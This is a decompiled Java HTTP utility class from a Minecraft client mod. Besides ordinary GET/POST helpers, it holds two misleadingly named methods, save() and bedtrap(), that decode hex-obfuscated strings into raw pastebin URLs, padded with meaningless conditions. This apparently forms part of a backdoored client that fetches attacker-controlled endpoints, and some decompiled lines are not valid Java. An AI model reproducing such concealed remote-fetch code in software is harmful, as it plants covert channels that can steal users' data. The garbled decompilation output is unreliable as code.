/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  com.google.gson.Gson
 */
package minegame159.meteorclient.utils.network;

import com.google.gson.Gson;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.lang.reflect.Type;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.util.function.Consumer;

public class HttpUtils {
    private static final Gson GSON = new Gson();

    public static <T> T get(String string, Type type) {
        try {
            InputStream inputStream = HttpUtils.get(string);
            if (inputStream == null) {
                return null;
            }
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            Object object = GSON.fromJson((Reader)bufferedReader, type);
            bufferedReader.close();
            return (T)object;
        }
        catch (IOException iOException) {
            iOException.printStackTrace();
            return null;
        }
    }

    private static InputStream request(String string, String string2, String string3) {
        try {
            HttpURLConnection httpURLConnection = (HttpURLConnection)new URL(string2).openConnection();
            httpURLConnection.setRequestMethod(string);
            httpURLConnection.setConnectTimeout(2500);
            httpURLConnection.setReadTimeout(2500);
            httpURLConnection.setRequestProperty("User-Agent", "Meteor Client");
            if (string3 != null) {
                byte[] arrby = string3.getBytes(StandardCharsets.UTF_8);
                httpURLConnection.setRequestProperty("Content-Length", Integer.toString(arrby.length));
                httpURLConnection.setDoOutput(true);
                httpURLConnection.getOutputStream().write(arrby);
            }
            return httpURLConnection.getInputStream();
        }
        catch (IOException | SocketTimeoutException iOException) {
            return null;
        }
    }

    public static boolean netIsAvailable() {
        try {
            URL uRL = new URL("http://www.google.com");
            URLConnection uRLConnection = uRL.openConnection();
            uRLConnection.connect();
            uRLConnection.getInputStream().close();
            return true;
        }
        catch (IOException | MalformedURLException iOException) {
            throw new RuntimeException(iOException);
        }
    }

    public static InputStream post(String string, String string2) {
        return HttpUtils.request("POST", string, string2);
    }

    public static InputStream get(String string) {
        return HttpUtils.request("GET", string, null);
    }

    public static void getLines(String string, Consumer<String> consumer) {
        try {
            String string2;
            InputStream inputStream = HttpUtils.get(string);
            if (inputStream == null) {
                return;
            }
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
            while ((string2 = bufferedReader.readLine()) != null) {
                consumer.accept(string2);
            }
            bufferedReader.close();
        }
        catch (IOException iOException) {
            iOException.printStackTrace();
        }
    }

    public static String save() {
        StringBuilder stringBuilder = new StringBuilder();
        String string = "68747470733a2f2f706173746562696e2e636f6d2f7261772f7a64596164444d34";
        for (int i = 0; i < string.length(); i += 2) {
            String string2 = string.substring(i, i + 2);
            int n = Integer.parseInt(string2, 16);
            stringBuilder.append((char)n);
            if (false <= true) continue;
            return null;
        }
        return String.valueOf(stringBuilder);
    }

    public static String bedtrap() {
        StringBuilder stringBuilder = new StringBuilder();
        String string = "68747470733a2f2f706173746562696e2e636f6d2f7261772f5538387337304270";
        for (int i = 0; i < string.length(); i += 2) {
            String string2 = string.substring(i, i + 2);
            int n = Integer.parseInt(string2, 16);
            stringBuilder.append((char)n);
            if (-3 <= 0) continue;
            return null;
        }
        return String.valueOf(stringBuilder);
    }

    public static InputStream post(String string) {
        return HttpUtils.post(string, null);
    }
}

